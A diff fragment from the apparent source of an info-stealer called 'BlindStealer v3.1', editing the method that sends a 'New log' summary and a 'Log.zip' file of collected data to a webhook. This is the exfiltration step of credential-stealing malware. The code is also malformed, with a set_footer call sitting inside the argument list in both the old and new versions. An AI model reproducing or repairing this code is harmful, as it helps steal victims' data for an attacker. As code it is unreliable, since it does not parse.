@@ -60,13 +60,12 @@ class Upload:
 
     def send(self):
         self.webhook.send(
-            embed=Embed
-        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
-        (
+            embed=Embed(
                 title="New log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
             ),
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
             file=File("Log.zip"),
                 username="BlindStealer - v3.1",
                 avatar_url="https://i.imgur.com/LNVOaxg.png",
